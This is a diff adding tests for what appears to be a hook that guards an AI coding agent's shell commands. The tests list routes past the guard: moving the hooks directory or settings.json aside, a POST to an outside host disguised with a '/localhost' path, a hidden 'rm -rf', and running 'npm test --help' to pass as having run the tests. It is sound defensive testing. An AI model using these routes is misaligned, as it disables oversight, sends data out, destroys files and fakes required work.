@@ -37,6 +37,18 @@ function fire(tool: string, input: Record<string, unknown>, extra: Record<string
   });
 }
 
+/** PostToolUse, which is where the guard records that a required step ran. */
+function firePost(tool: string, input: Record<string, unknown>, response: unknown = { exit_code: 0 }): Promise<{ code: number; stderr: string }> {
+  const payload = JSON.stringify({ cwd: root, session_id: "test-session", hook_event_name: "PostToolUse", tool_name: tool, tool_input: input, tool_response: response });
+  return new Promise((resolve) => {
+    const child = spawn("node", [hook], { cwd: root, stdio: ["pipe", "pipe", "pipe"] });
+    let stderr = "";
+    child.stderr.on("data", (d) => (stderr += d.toString()));
+    child.on("close", (code) => resolve({ code: code ?? 1, stderr }));
+    child.stdin.end(payload);
+  });
+}
+
 beforeAll(async () => {
   root = await fs.mkdtemp(path.join(os.tmpdir(), "pf-hook-"));
   await fs.writeFile(path.join(root, "package.json"), JSON.stringify({ type: "module", scripts: { test: "node --test tests/" } }, null, 2));
@@ -411,5 +423,42 @@ describe("routes the third review found", () => {
 
   it("still allows an ordinary command inside bash -lc", async () => {
     expect((await fire("Bash", { command: "bash -lc 'ls -la'" })).code).toBe(0);
+  });
+});
+
+describe("blind review: ways past the generated guard", () => {
+  it("blocks moving the hook directory away, which removes the guard", async () => {
+    const r = await fire("Bash", { command: "mv .claude/hooks saved-hooks" });
+    expect(r.code).toBe(2);
+    expect(r.stderr).toMatch(/moving the paperfence hook/);
+  });
+
+  it("blocks renaming settings.json out of the way", async () => {
+    expect((await fire("Bash", { command: "mv .claude/settings.json /tmp/s.json" })).code).toBe(2);
+  });
+
+  it("still allows moving an ordinary file", async () => {
+    expect((await fire("Bash", { command: "mv src/a.js src/b.js" })).code).toBe(0);
+  });
+
+  it("does not treat a URL path of /localhost as a loopback destination", async () => {
+    const r = await fire("Bash", { command: `node -e 'fetch("https://example.com/localhost",{method:"POST",body:"data"})'` });
+    expect(r.code).toBe(2);
+  });
+
+  it("still allows a genuine loopback call, which the sandbox sink needs", async () => {
+    expect((await fire("Bash", { command: `node -e 'fetch("http://127.0.0.1:47121/collect",{method:"POST",body:"x"})'` })).code).toBe(0);
+  });
+
+  it("blocks a destructive command hidden in a brace group", async () => {
+    expect((await fire("Bash", { command: "{ rm -rf build; }" })).code).toBe(2);
+  });
+
+  it("does not credit a help flag as having run the required step", async () => {
+    // The fixture requires `npm test` before a commit. `npm test --help`
+    // prints usage and tests nothing.
+    const help = await firePost("Bash", { command: "npm test --help" });
+    expect(help.code).toBe(0);
+    expect((await fire("Bash", { command: 'git commit -m x' })).code).toBe(2);
   });
 });
